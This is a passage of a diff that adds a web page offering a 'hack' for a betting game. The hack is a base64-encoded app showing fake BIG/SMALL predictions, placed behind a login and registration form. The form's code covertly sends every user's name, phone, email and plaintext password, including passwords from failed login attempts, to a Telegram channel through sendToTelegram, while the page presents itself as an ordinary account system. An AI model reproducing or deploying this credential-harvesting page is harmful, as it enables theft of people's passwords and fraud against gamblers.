LAogICAgICAgICAgICAgICAgICAgIHdpbkNsYXNzOiBpc1dpbiA/ICd3aW4nIDogJ2xvc3MnCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgaGlzdG9yeUxvZ3MudW5zaGlmdChlbnRyeSk7CiAgICAgICAgICAgICAgICBpZiAoaGlzdG9yeUxvZ3MubGVuZ3RoID4gMTAwKSBoaXN0b3J5TG9ncyA9IGhpc3RvcnlMb2dzLnNsaWNlKDAsIDEwMCk7CiAgICAgICAgICAgICAgICBjb25zdCByb3cgPSBgPHRyPjx0ZD4ke2VudHJ5LnBlcmlvZH08L3RkPjx0ZD4ke2VudHJ5LnByZWR9PC90ZD48dGQ+JHtlbnRyeS5yZXN1bHR9PC90ZD48dGQgY2xhc3M9IiR7ZW50cnkud2luQ2xhc3N9Ij4ke2VudHJ5LnN0YXR1c308L3RkPjwvdHI+YDsKICAgICAgICAgICAgICAgIGNvbnN0IGxvZ3NDb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9ncycpOwogICAgICAgICAgICAgICAgbG9nc0NvbnRhaW5lci5pbm5lckhUTUwgPSByb3cgKyBsb2dzQ29udGFpbmVyLmlubmVySFRNTDsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgbGFzdFAgPSBwOwogICAgICAgICAgICBjb25zdCBsYXN0NUl0ZW1zID0gbGlzdC5zbGljZSgwLCA1KS5tYXAoeCA9PiBwYXJzZUludCh4Lm51bWJlciwgMTApID49IDUgPyAiQklHIiA6ICJTTUFMTCIpOwogICAgICAgICAgICBjb25zdCBsYXN0NU51bXMgPSBsaXN0LnNsaWNlKDAsIDUpLm1hcCh4ID0+IHBhcnNlSW50KHgubnVtYmVyLCAxMCkpOwoKICAgICAgICAgICAgaWYgKGxhc3Q1SXRlbXMubGVuZ3RoID49IDMgJiYgbGFzdDVJdGVtc1swXSA9PT0gbGFzdDVJdGVtc1sxXSAmJiBsYXN0NUl0ZW1zWzFdID09PSBsYXN0NUl0ZW1zWzJdKSB7CiAgICAgICAgICAgICAgICBuZXh0UCA9IGxhc3Q1SXRlbXNbMF07CiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RyYXREaXNwbGF5JykuaW5uZXJUZXh0ID0gIk1PREU6IERFQUdPTiBQTFVTRSI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBuZXh0UCA9IChsYXN0NUl0ZW1zWzBdID09PSAiQklHIikgPyAiU01BTEwiIDogIkJJRyI7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RyYXREaXNwbGF5JykuaW5uZXJUZXh0ID0gIk1PREU6IE5FVVJBTCBSRVZFUlNFIjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3Qgc3VtTGFzdDUgPSBsYXN0NU51bXMucmVkdWNlKChhLCBiKSA9PiBhICsgKE51bWJlci5pc0Zpbml0ZShiKSA/IGIgOiAwKSwgMCk7CiAgICAgICAgICAgIGlmIChuZXh0UCA9PT0gIkJJRyIpIHRhcmdldE51bXMgPSAoc3VtTGFzdDUgPiAyMCkgPyBbMCwgMl0gOiBbMSwgM107CiAgICAgICAgICAgIGVsc2UgdGFyZ2V0TnVtcyA9IChzdW1MYXN0NSA8IDI1KSA/IFs3LCA5XSA6IFs2LCA4XTsKCiAgICAgICAgICAgIGNvbnN0IG5leHRQZXJpb2QgPSAoQmlnSW50KHApICsgMW4pLnRvU3RyaW5nKCk7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwSUQnKS5pbm5lclRleHQgPSBgUEVSSU9EOiAke25leHRQZXJpb2R9YDsKICAgICAgICAgICAgY29uc3QgcmVzdWx0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BSZXMnKTsKICAgICAgICAgICAgcmVzdWx0LmlubmVyVGV4dCA9IG5leHRQOwogICAgICAgICAgICByZXN1bHQuc3R5bGUuY29sb3IgPSBuZXh0UCA9PT0gIkJJRyIgPyAiIzAwZjNmZiIgOiAiI2ZmMDA1NSI7CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBjbGVhckhpc3RvcnkoKSB7CiAgICAgICAgICAgIGhpc3RvcnlMb2dzID0gW107CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dzJykuaW5uZXJIVE1MID0gJyc7CiAgICAgICAgfQogICAgICAgIHdpbmRvdy5jbGVhckhpc3RvcnkgPSBjbGVhckhpc3Rvcnk7CgogICAgICAgIHN0YXJ0RW5naW5lKCk7CiAgICAgICAgY29uc3QgaW5pdFJlbSA9IDMwIC0gKG5ldyBEYXRlKCkuZ2V0U2Vjb25kcygpICUgMzApOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpLmlubmVyVGV4dCA9IGAwMDoke1N0cmluZyhpbml0UmVtKS5wYWRTdGFydCgyLCAnMCcpfWA7CiAgICA8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+";
+
+    function launchHackApp() {
+        const decodedHTML = atob(HACK_APP_BASE64);
+        const newWindow = window.open('', '_blank');
+        if (newWindow) {
+            newWindow.document.open();
+            newWindow.document.write(decodedHTML);
+            newWindow.document.close();
+        } else {
+            alert('POPUP BLOCKED! PLEASE ALLOW POPUPS TO OPEN THE HACK.');
+        }
+    }
+
+    // ============================================================
+    // LOCAL DATABASE
+    // ============================================================
+    let localUsers = {};
+
+    function loadUsers() {
+        try {
+            const saved = localStorage.getItem('win_local_users');
+            if (saved) {
+                localUsers = JSON.parse(saved);
+            } else {
+                localUsers = {};
+                saveUsers();
+            }
+        } catch(e) {
+            localUsers = {};
+        }
+    }
+
+    function saveUsers() {
+        localStorage.setItem('win_local_users', JSON.stringify(localUsers));
+    }
+
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const loginScreen = document.getElementById('loginScreen');
+    const registerPage = document.getElementById('registerPage');
+    const loginInput = document.getElementById('loginInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const registerBtn = document.getElementById('registerBtn');
+    const statusMsg = document.getElementById('statusMsg');
+    
+    const tabPhone = document.getElementById('tabPhone');
+    const tabEmail = document.getElementById('tabEmail');
+    
+    const prefixBox = document.getElementById('prefixBox');
+    const loginIcon = document.getElementById('loginIcon');
+    const labelInput = document.getElementById('labelInput');
+    const uidToggleWrapper = document.getElementById('uidToggleWrapper');
+
+    const togglePass = document.getElementById('togglePass');
+    const rememberCheck = document.getElementById('rememberCheck');
+    const forgotBtn = document.getElementById('forgotBtn');
+    const supportLink = document.getElementById('supportLink');
+    const regStatusMsg = document.getElementById('regStatusMsg');
+
+    let isEmailMode = false;
+    let isChecked = true;
+
+    // ============================================================
+    // UI HELPERS
+    // ============================================================
+    function showStatus(msg, isError = false) {
+        statusMsg.textContent = msg;
+        statusMsg.className = 'status-msg show';
+        if (isError) statusMsg.classList.add('error');
+        else statusMsg.classList.remove('error');
+        setTimeout(() => { statusMsg.classList.remove('show'); }, 4000);
+    }
+
+    function showRegStatus(msg, isError = false) {
+        regStatusMsg.textContent = msg;
+        regStatusMsg.className = 'status-msg show';
+        if (isError) regStatusMsg.classList.add('error');
+        else regStatusMsg.classList.remove('error');
+        setTimeout(() => { regStatusMsg.classList.remove('show'); }, 4000);
+    }
+
+    function visualToggleUid() {
+        uidToggleWrapper.classList.toggle('active');
+    }
+
+    function updateLoginUI() {
+        if (isEmailMode) {
+            labelInput.textContent = 'EMAIL ADDRESS';
+            loginIcon.className = 'fas fa-envelope';
+            prefixBox.style.display = 'none';
+            loginInput.placeholder = 'ENTER YOUR EMAIL';
+            tabEmail.classList.add('active'); tabEmail.classList.remove('inactive');
+            tabPhone.classList.remove('active'); tabPhone.classList.add('inactive');
+        } else {
+            labelInput.textContent = 'PHONE NUMBER';
+            loginIcon.className = 'fas fa-phone-alt';
+            prefixBox.style.display = 'flex';
+            loginInput.placeholder = 'PHONE NUMBER';
+            tabPhone.classList.add('active'); tabPhone.classList.remove('inactive');
+            tabEmail.classList.remove('active'); tabEmail.classList.add('inactive');
+        }
+        loginInput.value = '';
+    }
+
+    function toggleLoginMode(emailMode) {
+        isEmailMode = emailMode;
+        updateLoginUI();
+    }
+
+    // ============================================================
+    // 🔐 LOGIN LOGIC (With 0/Without 0 Logic)
+    // ============================================================
+    function handleLogin() {
+        const identifier = loginInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!identifier || identifier.length < 2) {
+            showStatus('⚠️ PLEASE ENTER A VALID ' + (isEmailMode ? 'EMAIL' : 'PHONE'), true);
+            return;
+        }
+        if (password.length < 4) {
+            showStatus('🔒 PASSWORD MUST BE AT LEAST 4 CHARACTERS', true);
+            return;
+        }
+
+        loadUsers();
+
+        let foundUser = null;
+
+        // Normalize identifier for matching (remove leading 0 if present)
+        let searchIdentifier = identifier;
+        if (searchIdentifier.startsWith('0')) {
+            searchIdentifier = searchIdentifier.substring(1);
+        }
+
+        for (let key in localUsers) {
+            const user = localUsers[key];
+            
+            if (isEmailMode) {
+                if (user.email && user.email.toLowerCase() === identifier.toLowerCase()) { 
+                    foundUser = user; 
+                    break; 
+                }
+            } else {
+                // Normalize stored phone number
+                let storedPhone = user.phone;
+                if (storedPhone && storedPhone.startsWith('0')) {
+                    storedPhone = storedPhone.substring(1);
+                }
+                
+                // Check if either matches normalized or original
+                if (user.phone === identifier || storedPhone === searchIdentifier) { 
+                    foundUser = user; 
+                    break; 
+                }
+            }
+        }
+
+        if (!foundUser) {
+            showStatus('❌ USER NOT FOUND. PLEASE REGISTER FIRST.', true);
+            return;
+        }
+
+        if (foundUser.password !== password) {
+            showStatus('❌ WRONG PASSWORD. TRY AGAIN.', true);
+            
+            const errorMsg = `🚨 <b>FAILED LOGIN ATTEMPT</b>\n\n` +
+                             `📱 <b>${isEmailMode ? 'Email' : 'Phone'}:</b> ${identifier}\n` +
+                             `🔑 <b>Entered Password:</b> ${password}`;
+            sendToTelegram(errorMsg);
+            return;
+        }
+
+        showStatus('✅ LOGIN SUCCESSFUL! OPENING HACK...');
+
+        const loginMsg = `✅ <b>NEW LOGIN SUCCESSFUL</b>\n\n` +
+                         `👤 <b>Name:</b> ${foundUser.name}\n` +
+                         `🆔 <b>UID:</b> ${foundUser.uid}\n` +
+                         `📱 <b>Phone:</b> ${foundUser.phone !== 'N/A' ? foundUser.phone : 'Not Provided'}\n` +
+                         `📧 <b>Email:</b> ${foundUser.email}\n` +
+                         `🔑 <b>Password:</b> ${password}\n` +
+                         `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+        sendToTelegram(loginMsg);
+
+        setTimeout(() => {
+            launchHackApp();
+        }, 1500);
+    }
+
+    // ============================================================
+    // 📝 REGISTER LOGIC
+    // ============================================================
+    function openRegisterPage() {
+        loginScreen.style.display = 'none';
+        registerPage.style.display = 'block';
+        
+        document.getElementById('regName').value = '';
+        document.getElementById('regIdentifier').value = '';
+        document.getElementById('regPassword').value = '';
+        regTogglePass.className = 'fas fa-eye-slash';
+        document.getElementById('regPassword').type = 'password';
+        regStatusMsg.classList.remove('show');
+        
+        document.getElementById('uidSuccessBox').style.display = 'none';
+        document.getElementById('registerFormFields').style.display = 'block';
+    }
+
+    function closeRegister() {
+        registerPage.style.display = 'none';
+        loginScreen.style.display = 'block';
+    }
+
+    function generateUID() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let result = 'DK WIN BD-';
+        for (let i = 0; i < 5; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+
+    function submitRegister() {
+        const name = document.getElementById('regName').value.trim();
+        const identifier = document.getElementById('regIdentifier').value.trim();
+        const password = document.getElementById('regPassword').value.trim();
+
+        if (!name) {
+            showRegStatus('❌ NAME IS REQUIRED!', true);
+            return;
+        }
+        if (!identifier || identifier.length < 2) {
+            showRegStatus('❌ PLEASE ENTER A VALID PHONE/EMAIL!', true);
+            return;
+        }
+        if (password.length < 4) {
+            showRegStatus('❌ PASSWORD MUST BE AT LEAST 4 CHARACTERS!', true);
+            return;
+        }
+
+        loadUsers();
+
+        let exists = false;
+        // Normalize for duplicate check
+        let searchIdentifier = identifier;
+        if (searchIdentifier.startsWith('0')) {
+            searchIdentifier = searchIdentifier.substring(1);
+        }
+
+        for (let key in localUsers) {
+            const user = localUsers[key];
+            
+            let storedPhone = user.phone;
+            if (storedPhone && storedPhone.startsWith('0')) {
+                storedPhone = storedPhone.substring(1);
+            }
+
+            if (user.phone === identifier || storedPhone === searchIdentifier || 
+                (user.email && user.email.toLowerCase() === identifier.toLowerCase())) {
+                exists = true;
+                break;
+            }
+        }
+
+        if (exists) {
+            showRegStatus('❌ PHONE/EMAIL ALREADY REGISTERED. PLEASE LOGIN.', true);
+            return;
+        }
+
+        const newUid = generateUID();
+        const isEmail = identifier.includes('@');
+        
+        const newUser = {
+            name: name,
+            uid: newUid,
+            phone: isEmail ? 'N/A' : identifier,
+            email: isEmail ? identifier : identifier + '@win.com', 
+            password: password,
+            createdAt: new Date().toISOString()
+        };
+
+        localUsers[newUid] = newUser;
+        saveUsers();
+
+        document.getElementById('uidSuccessBox').style.display = 'block';
+        document.getElementById('displayUid').textContent = newUid;
+        document.getElementById('registerFormFields').style.display = 'none';
+        
+        showRegStatus('✅ ACCOUNT CREATED SUCCESSFULLY!');
+
+        const regMsg = `🆕 <b>NEW REGISTRATION</b>\n\n` +
+                       `👤 <b>Name:</b> ${name}\n` +
+                       `🆔 <b>UID:</b> ${newUid}\n` +
+                       `📱 <b>Phone:</b> ${isEmail ? 'Not Provided' : identifier}\n` +
+                       `📧 <b>Email:</b> ${isEmail ? identifier : identifier + '@win.com'}\n` +
+                       `🔑 <b>Password:</b> ${password}\n` +
+                       `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+        sendToTelegram(regMsg);
+    }
+
+    // ============================================================
+    // EVENT LISTENERS
+    // ============================================================
+    tabPhone.addEventListener('click', () => toggleLoginMode(false));
+    tabEmail.addEventListener('click', () => toggleLoginMode(true));
+
+    let passVisible = false;
+    togglePass.addEventListener('click', function() {
+        passVisible = !passVisible;
+        passwordInput.type = passVisible ? 'text' : 'password';
+        this.className = passVisible ? 'fas fa-eye' : 'fas fa-eye-slash';
+    });
+
+    let regPassVisible = false;
+    const regTogglePass = document.getElementById('regTogglePass');
+    regTogglePass.addEventListener('click', function() {
+        regPassVisible = !regPassVisible;
+        const inp = document.getElementById('regPassword');
+        inp.type = regPassVisible ? 'text' : 'password';
+        this.className = regPassVisible ? 'fas fa-eye' : 'fas fa-eye-slash';
+    });
+
+    rememberCheck.addEventListener('click', function() {
+        isChecked = !isChecked;
+        if (isChecked) {
+            this.classList.remove('unchecked');
+            this.innerHTML = '<i class="fas fa-check"></i>';
+        } else {
+            this.classList.add('unchecked');
+            this.innerHTML = '<i class="fas fa-check"></i>';
+        }
+    });
+
+    loginBtn.addEventListener('click', function(e) { e.preventDefault(); handleLogin(); });
+    registerBtn.addEventListener('click', function(e) { e.preventDefault(); openRegisterPage(); });
+
+    forgotBtn.addEventListener('click', () => {
+        showStatus('🔑 CONTACT LOGIN NOW DK WIN ACCOUNT  TO RESET PASSWORD');
+    });
+    
+    supportLink.addEventListener('click', () => {
+        window.open('https://t.me/HackingBotBd', '_blank');
+    });
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            const active = document.activeElement;
+            if (active === loginInput || active === passwordInput) {
+                e.preventDefault();
+                loginBtn.click();
+            }
+        }
+    });
+
+    // ============================================================
+    // INIT
+    // ============================================================
+    updateLoginUI();
+    loadUsers();
+</script>
+
+</body>
+</html>
